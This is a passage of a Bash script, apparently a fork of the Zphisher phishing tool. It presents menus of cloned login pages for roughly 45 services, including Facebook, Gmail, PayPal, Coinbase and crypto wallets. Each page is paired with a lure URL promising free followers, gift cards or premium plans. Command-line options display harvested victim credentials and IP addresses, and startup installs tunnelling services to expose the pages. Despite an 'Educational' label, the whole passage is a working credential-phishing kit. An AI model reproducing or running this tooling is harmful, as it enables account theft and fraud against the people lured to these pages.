	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}3${RED}]${BLUE} Masked URL   : ${ORANGE}$masked_url"
	echo -e "\n${DIM}${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

# ============================================================================
# SITE TEMPLATES (CATEGORIZED)
# ============================================================================

## Facebook
site_facebook() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ Facebook Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ Instagram Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ Google Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ VK Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Microsoft
site_microsoft() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ Microsoft Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Microsoft Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Microsoft Teams Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in
		1 | 01)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		2 | 02)
			website="microsoft_teams"
			mask='https://join-teams-meeting-free'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_microsoft; };;
	esac
}

## Discord
site_discord() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ Discord Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Discord Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Discord Nitro Gift Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in
		1 | 01)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		2 | 02)
			website="discord_nitro"
			mask='https://claim-discord-nitro-free-gift'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_discord; };;
	esac
}

## Netflix
site_netflix() {
	cat <<- EOF

		${GREEN}${BOLD} ═══ Netflix Templates ═══${RESET}

		${RED}[${WHITE}01${RED}]${ORANGE} Netflix Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Netflix Premium Upgrade Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in
		1 | 01)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		2 | 02)
			website="netflix_premium"
			mask='https://get-netflix-premium-free-upgrade'
			tunnel_menu;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_netflix; };;
	esac
}

# ============================================================================
# MAIN MENU (CATEGORIZED)
# ============================================================================

## Main Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}${BOLD} ═══ Select Target Platform ═══${RESET} ${DIM}(Educational Demo)${RESET}

		${CYAN}${BOLD} ── Social Media ──${RESET}
		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}03${RED}]${ORANGE} Twitter
		${RED}[${WHITE}04${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}05${RED}]${ORANGE} Snapchat      ${RED}[${WHITE}06${RED}]${ORANGE} Pinterest
		${RED}[${WHITE}07${RED}]${ORANGE} LinkedIn      ${RED}[${WHITE}08${RED}]${ORANGE} Reddit        ${RED}[${WHITE}09${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Badoo         ${RED}[${WHITE}11${RED}]${ORANGE} Quora

		${CYAN}${BOLD} ── Entertainment ──${RESET}
		${RED}[${WHITE}12${RED}]${ORANGE} Netflix       ${RED}[${WHITE}13${RED}]${ORANGE} Spotify       ${RED}[${WHITE}14${RED}]${ORANGE} Twitch
		${RED}[${WHITE}15${RED}]${ORANGE} Disney+       ${RED}[${WHITE}16${RED}]${ORANGE} Apple Music

		${CYAN}${BOLD} ── Gaming ──${RESET}
		${RED}[${WHITE}17${RED}]${ORANGE} Steam         ${RED}[${WHITE}18${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} XBOX
		${RED}[${WHITE}20${RED}]${ORANGE} Roblox        ${RED}[${WHITE}21${RED}]${ORANGE} Epic Games

		${CYAN}${BOLD} ── Productivity & Email ──${RESET}
		${RED}[${WHITE}22${RED}]${ORANGE} Google        ${RED}[${WHITE}23${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}24${RED}]${ORANGE} Yahoo
		${RED}[${WHITE}25${RED}]${ORANGE} Protonmail    ${RED}[${WHITE}26${RED}]${ORANGE} Yandex        ${RED}[${WHITE}27${RED}]${ORANGE} Wordpress

		${CYAN}${BOLD} ── Developer Platforms ──${RESET}
		${RED}[${WHITE}28${RED}]${ORANGE} Github        ${RED}[${WHITE}29${RED}]${ORANGE} Gitlab        ${RED}[${WHITE}30${RED}]${ORANGE} StackOverflow
		${RED}[${WHITE}31${RED}]${ORANGE} Docker Hub

		${CYAN}${BOLD} ── Communication ──${RESET}
		${RED}[${WHITE}32${RED}]${ORANGE} Discord       ${RED}[${WHITE}33${RED}]${ORANGE} Telegram      ${RED}[${WHITE}34${RED}]${ORANGE} Signal
		${RED}[${WHITE}35${RED}]${ORANGE} WhatsApp   

		${CYAN}${BOLD} ── Cloud & Finance ──${RESET}
		${RED}[${WHITE}36${RED}]${ORANGE} Paypal        ${RED}[${WHITE}37${RED}]${ORANGE} DropBox       ${RED}[${WHITE}38${RED}]${ORANGE} Ebay
		${RED}[${WHITE}39${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}40${RED}]${ORANGE} Adobe
		${RED}[${WHITE}41${RED}]${ORANGE} Origin        ${RED}[${WHITE}42${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}43${RED}]${ORANGE} Crypto Wallet ${RED}[${WHITE}44${RED}]${ORANGE} Coinbase
		${RED}[${WHITE}45${RED}]${ORANGE} Shopify

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		4 | 04)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		5 | 05)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		6 | 06)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		7 | 07)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		8 | 08)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		9 | 09)
			site_vk;;
		10)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		11)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		12)
			site_netflix;;
		13)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		14)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		15)
			website="disneyplus"
			mask='https://get-disneyplus-premium-free'
			tunnel_menu;;
		16)
			website="apple_music"
			mask='https://get-apple-music-premium-free'
			tunnel_menu;;
		17)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		18)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		19)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		20)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		21)
			website="epicgames"
			mask='https://get-epic-games-free-vbucks'
			tunnel_menu;;
		22)
			site_gmail;;
		23)
			site_microsoft;;
		24)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		25)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		26)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		27)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		28)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		29)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		30)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		31)
			website="dockerhub"
			mask='https://get-docker-hub-pro-free'
			tunnel_menu;;
		32)
			site_discord;;
		33)
			website="telegram"
			mask='https://get-telegram-premium-free'
			tunnel_menu;;
		34)
			website="signal"
			mask='https://signal-verified-account-free'
			tunnel_menu;;
		35)
			website="whatsapp"
			mask='https://get-whatsapp-premium-features-free'
			tunnel_menu;;
		36)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		37)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		38)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		39)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		40)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		41)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		42)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		43)
			website="crypto_wallet"
			mask='https://claim-free-crypto-airdrop'
			tunnel_menu;;
		44)
			website="coinbase"
			mask='https://coinbase-free-bitcoin-giveaway'
			tunnel_menu;;
		45)
			website="shopify"
			mask='https://get-shopify-premium-free'
			tunnel_menu;;
		99)
			about;;
		0 | 00)
			msg_exit;;
		*)
			warn_msg "Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	esac
}

# ============================================================================
# CLI ARGUMENTS
# ============================================================================

## Usage / Help
usage() {
	cat <<- EOF

		${BOLD}Zphisher v${__version__}${RESET} - Automated Phishing Tool (Educational)
		${DIM}Fork by Muhammad Taezeem | Original by htr-tech${RESET}

		${BOLD}Usage:${RESET} bash zphisher.sh [OPTION]

		${BOLD}Options:${RESET}
		  -h, --help       Show this help message
		  -v, --version    Show version info
		  -l, --log        Show recent log entries
		  -c, --creds      View saved credentials
		  -i, --ips        View saved victim IPs
		  --clean          Clean all server/log files and reset

	EOF
	exit 0
}

## Clean up
clean_all() {
	info_msg "Cleaning all temporary files..."
	rm -rf .server "$LOG_FILE" auth/ip.txt auth/usernames.dat 2>/dev/null
	success_msg "Cleaned all temporary files."
	exit 0
}

## Parse CLI arguments
parse_args() {
	while [[ $# -gt 0 ]]; do
		case "$1" in
			-h|--help)
				usage;;
			-v|--version)
				echo "Zphisher v${__version__} (Fork by Muhammad Taezeem)"
				exit 0;;
			-l|--log)
				if [[ -f "$BASE_DIR/$LOG_FILE" ]]; then
					echo -e "${BOLD}Recent log entries:${RESET}"
					tail -20 "$BASE_DIR/$LOG_FILE"
				else
					echo "No log file found."
				fi
				exit 0;;
			-c|--creds)
				if [[ -f "$BASE_DIR/auth/usernames.dat" ]]; then
					echo -e "${BOLD}Saved Credentials:${RESET}"
					cat "$BASE_DIR/auth/usernames.dat"
				else
					echo "No credentials found."
				fi
				exit 0;;
			-i|--ips)
				if [[ -f "$BASE_DIR/auth/ip.txt" ]]; then
					echo -e "${BOLD}Saved IPs:${RESET}"
					cat "$BASE_DIR/auth/ip.txt"
				else
					echo "No saved IPs found."
				fi
				exit 0;;
			--clean)
				clean_all;;
			*)
				echo "Unknown option: $1"
				usage;;
		esac
		shift
	done
}

# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================

## Handle arguments if any
[[ $# -gt 0 ]] && parse_args "$@"

## Main startup
log "INFO" "=== Zphisher v${__version__} started ==="
kill_pid
init_dirs
dependencies
check_status
install_cloudflared
install_localxpose
install_ngrok
main_menu
